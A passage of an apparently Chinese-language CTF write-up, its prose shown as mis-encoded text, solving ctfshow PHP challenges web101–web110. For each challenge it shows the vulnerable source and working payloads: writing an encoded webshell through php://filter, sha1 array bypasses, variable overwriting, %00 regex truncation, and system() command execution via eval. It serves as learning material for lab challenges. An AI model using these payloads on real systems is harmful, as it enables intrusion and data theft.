class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\?|[0-9]/&quot;</span>, $v3))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>åœ¨ä¸Šä¸€é¢˜åŸºç¡€ä¸Šå¤šè¿›è¡Œäº†è¿‡æ»¤ï¼Œæ‰€ä»¥ä¸Šé¢˜payloadæ— æ³•ä½¿ç”¨ï¼ŒæŸ¥äº†ä¸€ä¸‹èµ„æ–™ï¼Œå‘ç°è¿˜æœ‰ç±»åå°„çš„çŸ¥è¯†ç‚¹</p>
<blockquote>
<p>PHP Reflection APIæ˜¯PHP5æ‰æœ‰çš„æ–°åŠŸèƒ½ï¼Œå®ƒæ˜¯ç”¨æ¥å¯¼å‡ºæˆ–æå–å‡ºå…³äºç±»ã€æ–¹æ³•ã€å±æ€§ã€å‚æ•°ç­‰çš„è¯¦ç»†ä¿¡æ¯ï¼ŒåŒ…æ‹¬æ³¨é‡Šã€‚<br>
$class = new ReflectionClass(â€˜ctfshowâ€™); // å»ºç«‹ Personè¿™ä¸ªç±»çš„åå°„ç±»<br>
$instance  = $class-&gt;newInstanceArgs($args); // ç›¸å½“äºå®ä¾‹åŒ–ctfshowç±»</p>
</blockquote>
<p>paylaodä¸º</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?v1&#x3D;1&amp;v2&#x3D;echo new ReflectionClass&amp;v3&#x3D;;</span><br></pre></td></tr></table></figure>
<p>ä¹Ÿè¦åƒä¸Šé¢˜ä¸€æ ·æ”¹æ‰0x2då’Œæœ€åä¸€ä½è¿›è¡Œçˆ†ç ´</p>
<h3 id="web102"><a class="header-anchor" href="#web102">Â¶</a>web102</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$v1 = $_POST[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">$v2 = $_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">$v3 = $_GET[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">$v4 = is_numeric($v2) <span class="keyword">and</span> is_numeric($v3);</span><br><span class="line"><span class="keyword">if</span>($v4)&#123;</span><br><span class="line">    $s = substr($v2,<span class="number">2</span>);</span><br><span class="line">    $str = call_user_func($v1,$s);</span><br><span class="line">    <span class="keyword">echo</span> $str;</span><br><span class="line">    file_put_contents($v3,$str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>é¦–å…ˆç»§ç»­äº†è§£å‡ ä¸ªå‡½æ•°</p>
<blockquote>
<p><strong>is_numeric()</strong> å‡½æ•°ç”¨äºæ£€æµ‹å˜é‡æ˜¯å¦ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²ï¼Œå¦‚æœæŒ‡å®šçš„å˜é‡æ˜¯æ•°å­—å’Œæ•°å­—å­—ç¬¦ä¸²åˆ™è¿”å›trueï¼Œå¦åˆ™è¿”å›falseã€‚å¦‚æœå­—ç¬¦ä¸²ä¸­å«æœ‰ä¸€ä¸ªeä»£è¡¨ç§‘å­¦è®¡æ•°æ³•ï¼Œä¹Ÿå¯è¿”å›true</p>
<p><strong>call_user_func()</strong> å‡½æ•°ç”¨äºè°ƒç”¨æ–¹æ³•æˆ–è€…å˜é‡ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¢«è°ƒç”¨çš„å‡½æ•°ï¼Œç¬¬äºŒä¸ªæ˜¯è°ƒç”¨çš„å‡½æ•°çš„å‚æ•°</p>
<p><strong>file_put_contents()</strong> å‡½æ•°åº”è¯¥éƒ½ç†Ÿæ‚‰äº†ï¼Œå†™å…¥å†…å®¹åˆ°æ–‡ä»¶ä¸­ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ–‡ä»¶åï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯å†…å®¹</p>
</blockquote>
<p>é¦–å…ˆï¼Œgetä¼ å‚v2å’Œv3ï¼Œpostä¼ å‚v1ï¼›ifä¸­éœ€è¦v4ä¸ºçœŸæ‰èƒ½å¾€ä¸‹æ‰§è¡Œï¼Œè€Œv4è¦ä¸ºçœŸå°±æ˜¯v2ä¼ çš„å‚æ•°è¦ä¸ºæ•°å­—æˆ–è€…æ•°å­—å­—ç¬¦ä¸²ï¼ŒåŒæ—¶v2ä¹Ÿæ˜¯æˆ‘ä»¬è¦å†™å…¥çš„webshell<br>
ä¸ºäº†è®©v2ä¸ºæ•°å­—æˆ–è€…æ•°å­—å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆæŠŠæˆ‘ä»¬çš„webshellè½¬æ¢ä¸ºbase64ç¼–ç ï¼Œå†æŠŠbase64ç¼–ç è½¬æ¢ä¸º16è¿›åˆ¶ï¼Œè¿™æ˜¯ä¸€ç§åŠæ³•å»è½¬æ¢æˆæ•°å­—</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$b = base64_encode(<span class="string">&#x27;&lt;?=`tac *`;&#x27;</span>);</span><br><span class="line">$b = str_replace(<span class="string">&quot;=&quot;</span>,<span class="string">&quot;&quot;</span>,$b);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;base64åŠ å¯†å:&quot;</span>.$b.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">$a = call_user_func(<span class="string">&#x27;bin2hex&#x27;</span>,$b);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;16è¿›åˆ¶å½¢å¼:&quot;</span>.$a.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">var_dump(is_numeric($a));</span><br><span class="line"></span><br><span class="line"><span class="comment">/*è¿è¡Œç»“æœ</span></span><br><span class="line"><span class="comment">base64åŠ å¯†å:PD89YHRhYyAqYDs</span></span><br><span class="line"><span class="comment">16è¿›åˆ¶å½¢å¼:504438395948526859794171594473</span></span><br><span class="line"><span class="comment">bool(true)</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<p>è¯´æ˜ï¼š&lt;?=æ˜¯phpçš„çŸ­æ ‡ç­¾ï¼Œæ˜¯echo()çš„å¿«æ·ç”¨æ³•<br>
è¿˜æœ‰ä¸€ç‚¹ï¼Œå°±æ˜¯substr()å–å¾—æ˜¯ä»ä¸‹æ ‡ä¸º2å¼€å§‹çš„å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬åœ¨å‰é¢åŠ 00ä¸¤ä½æ•°<br>
æ‰€ä»¥payloadä¸º</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?v2&#x3D;00504438395948526859794171594473&amp;v3&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;dotast.php</span><br><span class="line"></span><br><span class="line">post:</span><br><span class="line">v1&#x3D;hex2bin</span><br></pre></td></tr></table></figure>
<p>è§£ç€å†è®¿é—®dotast.phpå³å¯å¾—åˆ°flag<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web102/%40%5DWGZPG6ZM95T567AW%40W0I5.png" alt=""></p>
<h3 id="web103"><a class="header-anchor" href="#web103">Â¶</a>web103</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$v1 = $_POST[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">$v2 = $_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">$v3 = $_GET[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">$v4 = is_numeric($v2) <span class="keyword">and</span> is_numeric($v3);</span><br><span class="line"><span class="keyword">if</span>($v4)&#123;</span><br><span class="line">    $s = substr($v2,<span class="number">2</span>);</span><br><span class="line">    $str = call_user_func($v1,$s);</span><br><span class="line">    <span class="keyword">echo</span> $str;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/.*p.*h.*p.*/i&quot;</span>,$str))&#123;</span><br><span class="line">        file_put_contents($v3,$str);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Sorry&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>å’Œä¸Šé¢˜ä¸€æ ·çš„æ€è·¯ï¼Œpayloadç»§ç»­ç”¨ä¸Šé¢˜çš„</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?v2&#x3D;00504438395948526859794171594473&amp;v3&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;dotast.php</span><br><span class="line"></span><br><span class="line">post:</span><br><span class="line">v1&#x3D;hex2bin</span><br></pre></td></tr></table></figure>
<h3 id="web104"><a class="header-anchor" href="#web104">Â¶</a>web104</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    $v1 = $_POST[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    $v2 = $_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(sha1($v1)==sha1($v2))&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å€’æ˜¯å˜å¾—ç®€å•äº†ï¼Œè€ƒçš„sha1å‡½æ•°ç‰¹æ€§ï¼Œsha1()å‡½æ•°æ— æ³•å¤„ç†æ•°ç»„ç±»å‹ï¼Œä¼šè¿”å›NULLï¼Œifæ¡ä»¶å°±æˆç«‹äº†ï¼Œæ‰€ä»¥paylaodä¸º</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?v2[]&#x3D;</span><br><span class="line"></span><br><span class="line">post:</span><br><span class="line">v1[]&#x3D;</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web104/701D5594A%60SX_%60RC_PP3W_V.png" alt=""></p>
<h3 id="web105"><a class="header-anchor" href="#web105">Â¶</a>web105</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$error=<span class="string">&#x27;ä½ è¿˜æƒ³è¦flagå˜›ï¼Ÿ&#x27;</span>;</span><br><span class="line">$suces=<span class="string">&#x27;æ—¢ç„¶ä½ æƒ³è¦é‚£ç»™ä½ å§ï¼&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">    <span class="keyword">if</span>($key===<span class="string">&#x27;error&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $$key=$$value;</span><br><span class="line">&#125;<span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">    <span class="keyword">if</span>($value===<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $$key=$$value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!($_POST[<span class="string">&#x27;flag&#x27;</span>]==$flag))&#123;</span><br><span class="line">    <span class="keyword">die</span>($error);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;your are good&quot;</span>.$flag.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>($suces);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œåˆ©ç”¨çš„æ˜¯å˜é‡è¦†ç›–ï¼Œå…³é”®ç‚¹åœ¨$$key=$$valueï¼Œè¿™é‡ŒæŠŠ$keyçš„å€¼å½“ä½œäº†å˜é‡</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ä¾‹å¦‚ $key&#x3D;flag  åˆ™$$key&#x3D;$flag</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œä¸€å…±æœ‰ä¸‰ä¸ªå˜é‡ï¼Œ$errorã€$suceså’Œ$flagï¼›è¿™é‡Œé€šè¿‡die($error)æˆ–è€…die($suces)éƒ½å¯ä»¥è¾“å‡ºflagï¼Œæ‰€ä»¥æœ‰ä¸¤ä¸ªpaylaod<br>
<strong>ç¬¬ä¸€ç§ï¼š</strong><br>
é€šè¿‡die($error)è¾“å‡ºflagï¼Œé¦–å…ˆæˆ‘ä»¬æŠŠ$flagçš„å€¼ä¼ ç»™$dotastï¼Œæ¥ç€å†æŠŠ$dotastçš„å€¼ä¼ ç»™$errorï¼Œäºæ˜¯$errorçš„å€¼å°±æ˜¯flagï¼Œå†é€šè¿‡ifåˆ¤æ–­dieè¾“å‡ºå°±æ˜¯flag<br>
ä¾‹å¦‚$flag=ctfshow{xxxxx}ï¼Œ?dotast=flagï¼Œé€šè¿‡ç¬¬ä¸€ä¸ªforå¾ªç¯ï¼Œä¹Ÿå°±æ˜¯$dotast=$flagï¼Œ$dotast=ctfshow{xxxxx}ï¼Œæ¥ç€å†é€šè¿‡ç¬¬äºŒä¸ªforå¾ªç¯ï¼Œ$error=$dotastï¼Œæ­¤æ—¶$error=ctfshow{xxxxx}</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?dotast&#x3D;flag</span><br><span class="line"></span><br><span class="line">post:</span><br><span class="line">error&#x3D;dotast</span><br></pre></td></tr></table></figure>
<p><strong>ç¬¬äºŒç§ï¼š</strong><br>
é€šè¿‡die($suces)è¾“å‡ºflagï¼Œé¦–å…ˆæˆ‘ä»¬æŠŠflagçš„å€¼ä¼ ç»™suceså˜é‡ï¼Œæ¥ç€å†æŠŠflagçš„å€¼ç»™ç½®ç©ºï¼Œå·²è¾¾åˆ°ä¸‹é¢ifæ¡ä»¶ä¸º0ä¸æ‰§è¡Œçš„ç›®çš„ï¼Œå¾€ä¸‹æ‰§è¡Œï¼Œdie($suces)å³å¯æŠŠflagè¾“å‡º</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?suces&#x3D;flag&amp;flag&#x3D;</span><br></pre></td></tr></table></figure>
<h3 id="web106"><a class="header-anchor" href="#web106">Â¶</a>web106</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    $v1 = $_POST[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    $v2 = $_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(sha1($v1)==sha1($v2) &amp;&amp; $v1!=$v2)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åˆå›å½’åˆ°sha1()å‡½æ•°çš„é—®é¢˜ï¼Œè¿™æ¬¡åœ¨å‰é¢å¤šåŠ äº†ä¸€ä¸ªåˆ¤æ–­<code>$v1 != $v2</code>ï¼Œæˆ‘ä»¬å°±ç»™ä»–ä»¬èµ‹å€¼ä¸åŒå°±å¥½äº†ï¼Œpayloadå¦‚ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?v2[]&#x3D;1</span><br><span class="line"></span><br><span class="line">post:</span><br><span class="line">v1[]&#x3D;2</span><br></pre></td></tr></table></figure>
<h3 id="web107"><a class="header-anchor" href="#web107">Â¶</a>web107</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;v1&#x27;</span>]))&#123;</span><br><span class="line">    $v1 = $_POST[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    $v3 = $_GET[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    parse_str($v1,$v2);</span><br><span class="line">    <span class="keyword">if</span>($v2[<span class="string">&#x27;flag&#x27;</span>]==md5($v3))&#123;</span><br><span class="line">    	<span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>é¦–å…ˆéœ€è¦ä¼ ä¸€ä¸ªgetå‚æ•°<code>v3</code>å’Œä¸€ä¸ªpostå‚æ•°<code>v1</code>ï¼Œæ³¨æ„åˆ°ä¸€ä¸ªå‡½æ•°parse_str()</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">parse_str(string,array)</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th style="text-align:left">å‚æ•°</th>
<th style="text-align:left">æè¿°</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><em>string</em></td>
<td style="text-align:left">å¿…éœ€ã€‚è§„å®šè¦è§£æçš„å­—ç¬¦ä¸²ã€‚</td>
</tr>
<tr>
<td style="text-align:left"><em>array</em></td>
<td style="text-align:left">å¯é€‰ã€‚è§„å®šå­˜å‚¨å˜é‡çš„æ•°ç»„çš„åç§°ã€‚è¯¥å‚æ•°æŒ‡ç¤ºå˜é‡å°†è¢«å­˜å‚¨åˆ°æ•°ç»„ä¸­ã€‚</td>
</tr>
</tbody>
</table>
</blockquote>
<p>ä¸¾ä¾‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a = <span class="string">&quot;name=dotast&amp;age=666&quot;</span>;</span><br><span class="line">parse_str($a,$b);</span><br><span class="line"><span class="keyword">echo</span> $b[<span class="string">&#x27;name&#x27;</span>].<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $b[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">#è¾“å‡ºç»“æœ</span></span><br><span class="line"><span class="comment">//dotast</span></span><br><span class="line"><span class="comment">//666</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æ‰€ä»¥paylaodä¸º</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?v3&#x3D;dotast</span><br><span class="line"></span><br><span class="line">post:</span><br><span class="line">v1&#x3D;flag&#x3D;208f1b1289da972682cbc81c8684fcc8</span><br></pre></td></tr></table></figure>
<h3 id="web108"><a class="header-anchor" href="#web108">Â¶</a>web108</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (ereg (<span class="string">&quot;^[a-zA-Z]+$&quot;</span>, $_GET[<span class="string">&#x27;c&#x27;</span>])===<span class="literal">FALSE</span>)  &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//åªæœ‰36dçš„äººæ‰èƒ½çœ‹åˆ°flag</span></span><br><span class="line"><span class="keyword">if</span>(intval(strrev($_GET[<span class="string">&#x27;c&#x27;</span>]))==<span class="number">0x36d</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>é¦–å…ˆäº†è§£ä¸€ä¸‹å‡ ä¸ªå‡½æ•°</p>
<blockquote>
<p>**ereg() **å‡½æ•°æœç´¢ç”±æŒ‡å®šçš„å­—ç¬¦ä¸²ä½œä¸ºç”±æ¨¡å¼æŒ‡å®šçš„å­—ç¬¦ä¸²ï¼Œå¦‚æœå‘ç°æ¨¡å¼åˆ™è¿”å›trueï¼Œå¦åˆ™è¿”å›falseã€‚æœç´¢å¯¹äºå­—æ¯å­—ç¬¦æ˜¯åŒºåˆ†å¤§å°å†™çš„</p>
<p><strong>strrev()</strong> å‡½æ•°åè½¬å­—ç¬¦ä¸²ã€‚</p>
<p><strong>intval()</strong> å‡½æ•°ç”¨äºè·å–å˜é‡çš„æ•´æ•°å€¼</p>
</blockquote>
<p>é¦–å…ˆéœ€è¦çŸ¥é“%00å¯ä»¥æˆªæ–­ereg()å‡½æ•°çš„æœç´¢ï¼Œæ­£åˆ™è¡¨è¾¾å¼åªä¼šåŒ¹é…%00ä¹‹å‰çš„å†…å®¹ï¼›0x36dçš„åè¿›åˆ¶å†…å®¹ä¸º877ï¼Œæˆ‘ä»¬éœ€è¦å­—æ¯åœ¨å‰æ¥æ»¡è¶³ifæ¡ä»¶çš„æ­£åˆ™åŒ¹é…æ¥è·³è¿‡ifè¯­å¥ï¼Œæ¥ç€å†è¿›è¡Œå­—ç¬¦ä¸²çš„åè½¬å¾—åˆ°877aï¼Œæ¥ç€intval()å‡½æ•°å–æ•´æ•°éƒ¨åˆ†å¾—åˆ°877<br>
æ‰€ä»¥paylaodä¸º</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;a%00778</span><br></pre></td></tr></table></figure>
<h3 id="web109"><a class="header-anchor" href="#web109">Â¶</a>web109</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    $v1 = $_GET[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    $v2 = $_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, $v1) &amp;&amp; preg_match(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, $v2))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œä¼ å…¥ä¸¤ä¸ªå‚æ•°ï¼Œå¹¶ä¸”éƒ½éœ€è¦æœ‰å­—æ¯ï¼Œæˆ‘ä»¬ç”¨phpå†…ç½®ç±»è®©v1ä¸è¿›è¡ŒæŠ¥é”™ï¼Œv2æ‰§è¡Œæˆ‘ä»¬çš„å‘½ä»¤å°±å¥½äº†</p>
<blockquote>
<p><strong>Exception</strong> å¤„ç†ç”¨äºåœ¨æŒ‡å®šçš„é”™è¯¯å‘ç”Ÿæ—¶æ”¹å˜è„šæœ¬çš„æ­£å¸¸æµç¨‹ï¼Œæ˜¯phpå†…ç½®çš„å¼‚å¸¸å¤„ç†ç±»</p>
<p><strong>ReflectionClass</strong> æˆ–è€… <strong>ReflectionMethod</strong> éƒ½ä¸ºå¸¸ç”¨çš„åå°„ç±»ï¼Œå¯ä»¥ç†è§£ä¸ºä¸€ä¸ªç±»çš„æ˜ å°„</p>
</blockquote>
<p>æ‰€ä»¥payloadå¦‚ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?v1&#x3D;Exception&amp;v2&#x3D;system(&#39;tac fl36dg.txt&#39;)</span><br><span class="line">æˆ–è€…</span><br><span class="line">?v1&#x3D;ReflectionClass&amp;v2&#x3D;system(&#39;tac fl36dg.txt&#39;)</span><br><span class="line">æˆ–è€…</span><br><span class="line">?v1&#x3D;ReflectionMethod&amp;v2&#x3D;system(&#39;tac fl36dg.txt&#39;)</span><br></pre></td></tr></table></figure>
<h3 id="web110"><a class="header-anchor" href="#web110">Â¶</a>web110</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    $v1 = $_GET[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    $v2 = $_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, $v1))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, $v2))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œæ­£åˆ™è¿›è¡Œäº†åŒ¹é…ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨FilesystemIteratoræ–‡ä»¶ç³»ç»Ÿè¿­ä»£å™¨æ¥è¿›è¡Œåˆ©ç”¨ï¼Œé€šè¿‡æ–°å»ºFilesystemIteratorï¼Œä½¿ç”¨getcwd()æ¥æ˜¾ç¤ºå½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ç»“æ„ï¼Œpayloadä¸º</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?v1&#x3D;FilesystemIterator&amp;v2&#x3D;getcwd</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web110/DWS8H%40%7BSFV080HL%7D%7BXVH%7B%40X.png" alt=""><br>
å‘ç°æœ‰fl36dga.txtï¼Œæ¥ç€å†è®¿é—®å³å¯å¾—åˆ°flag<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web110/JFTZOQUY53BT7M9VEUP%5B%403O.png" alt=""></p>
<h3 id="web111"><a class="header-anchor" href="#web111">Â¶</a>web111</h3>
